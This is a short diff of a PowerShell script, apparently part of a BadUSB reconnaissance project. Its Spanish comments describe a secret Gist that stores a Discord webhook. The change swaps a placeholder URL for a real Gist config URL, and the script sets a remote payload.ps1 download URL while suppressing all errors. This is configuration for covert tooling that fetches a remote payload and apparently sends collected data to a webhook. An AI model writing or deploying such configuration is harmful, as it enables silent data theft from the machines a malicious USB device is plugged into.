@@ -22,7 +22,7 @@ $ErrorActionPreference = "SilentlyContinue"
 
 # URL raw de tu Gist secreto con el webhook de Discord.
 # Formato del Gist: { "webhook": "https://gist.githubusercontent.com/AndYLndR/356d9985092035a14b4121f1bd35dbe6/raw/b260b94bc416cd94bb5caa1dac1783a8ea30e665/config.json" }
-$ConfigUrl = "https://gist.githubusercontent.com/TU_USUARIO/TU_GIST_ID/raw/config.json"
+$ConfigUrl = "https://gist.githubusercontent.com/AndYLndR/356d9985092035a14b4121f1bd35dbe6/raw/b260b94bc416cd94bb5caa1dac1783a8ea30e665/config.json"
 
 # URL raw del payload principal en el repo.
 $PayloadUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/refs/heads/main/payloads/payload.ps1"
